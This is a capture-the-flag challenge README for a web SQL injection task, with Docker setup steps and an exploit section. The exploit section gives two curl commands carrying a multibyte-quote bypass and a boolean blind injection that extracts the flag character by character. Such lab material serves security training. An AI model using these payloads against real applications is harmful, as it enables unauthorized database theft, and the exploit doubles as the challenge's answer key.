Retro Web
---------

Not so easy SQL injection at all.

# Question Text

```
It is all in the challenge.

http://ctf.pwn.sg:9180
```

*Creator - quanyang (@quanyang)*

# Setup Guide

0. Install docker on the hosting system
1. Replace the flag in distribute/flag
2. Build the docker image with: `sh dockerbuild.sh`
3. Replace the port 1500 with your desired port in dockerrun.sh
4. Start the docker image: `sh dockerrun.sh`
5. Test the connectivity with netcat.

# Exploit Details

curl 'http://localhost:8180/?search' --data 'username=1%bf%27||(SUBSTR(flag,1,1)in(0x43)%26%26(username)in(0x61646D696E));#&action='

versus

curl 'http://localhost:8180/?search' --data 'username=1%bf%27||(SUBSTR(flag,1,1)in(0x42)%26%26(username)in(0x61646D696E));#&action='
